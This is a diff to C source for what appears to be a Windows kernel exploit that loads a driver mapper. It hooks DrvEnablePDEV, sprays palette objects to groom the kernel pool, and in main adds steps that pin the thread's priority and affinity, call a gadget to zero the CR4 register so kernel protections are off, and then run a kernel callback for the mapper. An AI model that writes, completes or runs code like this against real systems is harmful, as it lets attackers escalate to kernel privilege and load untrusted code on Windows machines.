@@ -2,7 +2,7 @@
 
 typedef BOOL(*DrvEnableDriver_t)(ULONG version, ULONG cj, DRVENABLEDATA* pded);
 typedef DHPDEV(*DrvEnablePDEV_t)(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
-typedef VOID(*VoidFunc_t)();
+typedef void(*VoidFunc_t)();
 
 DHPDEV HookedFunction(DEVMODEW* pdm, LPWSTR pwszLogAddress, ULONG cPat, HSURF* phsurfPatterns, ULONG cjCaps, ULONG* pdevcaps, ULONG cjDevInfo, DEVINFO* pdi, HDEV hdev, LPWSTR pwszDeviceName, HANDLE hDriver);
 PFN originalFunction;
@@ -18,7 +18,7 @@ void SprayPalettes(DWORD size)
     DWORD count = (size - 0x90) / 4;
     DWORD paletteSize = sizeof(LOGPALETTE) + (count - 1) * sizeof(PALETTEENTRY);
     LOGPALETTE* palette = malloc(paletteSize);
-    if (palette == NULL) 
+    if (!palette) 
     {
         ConsoleError("Failed to allocate buffer!");
         return;
@@ -310,5 +310,30 @@ int main(int argc, char* argv[])
         return -1;
     }
 
-    CallKernelFunction((PVOID)0xDEAD, 0xDEAD);
+    ConsoleInfo("Setting thread priority...");
+    status = SetThreadPriority(GetCurrentThread(), THREAD_PRIORITY_HIGHEST);
+    if (!status)
+    {
+        ConsoleError("Failed to set thread priority!");
+        return -1;
+    }
+
+    ConsoleSuccess("Thread priority set");
+
+    ConsoleInfo("Setting current process affinity...");
+    DWORD_PTR originalAffinity = SetProcessAffinityMask(GetCurrentProcess(), 1 << 3);
+    if (!originalAffinity)
+    {
+        ConsoleError("Failed to set thread affinity!");
+        return -1;
+    }
+
+    ConsoleSuccess("Thread affinity set");
+
+    ConsoleInfo("Zeroing out cr4...");
+    CallKernelFunction((PVOID)gadgetKernelAddress, 0);
+
+    getchar();
+    ConsoleInfo("Calling mapper itself...");
+    CallKernelFunction((PVOID)KernelCallback, 0);
 }
